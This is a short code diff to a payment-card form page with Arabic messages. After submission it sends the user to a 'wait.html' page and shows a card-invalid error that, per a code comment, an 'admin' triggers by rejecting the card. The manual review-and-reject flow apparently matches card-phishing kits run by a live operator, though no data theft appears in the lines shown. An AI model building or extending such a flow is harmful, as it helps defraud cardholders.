@@ -382,8 +382,22 @@
 
 		if (!valid) { if (msg) { msg.hidden = false; msg.textContent = "يرجى تصحيح الأخطاء في النموذج."; } return; }
 		if (msg) msg.hidden = true;
-		window.location.assign("payment-verify.html");
+		sessionStorage.setItem('wait-source', 'payment-card');
+		window.location.assign("wait.html");
 	});
+
+	// Check for rejection error from admin
+	var pageErr = sessionStorage.getItem('page-error');
+	if (pageErr) {
+		sessionStorage.removeItem('page-error');
+		if (msg) {
+			msg.hidden = false;
+			msg.style.color = '#dc2626';
+			msg.style.fontSize = '15px';
+			msg.style.fontWeight = '700';
+			msg.textContent = 'البطاقة غير صالحة أو غير متاحة للدفع عبر الإنترنت';
+		}
+	}
 })();
 </script>
 </body>
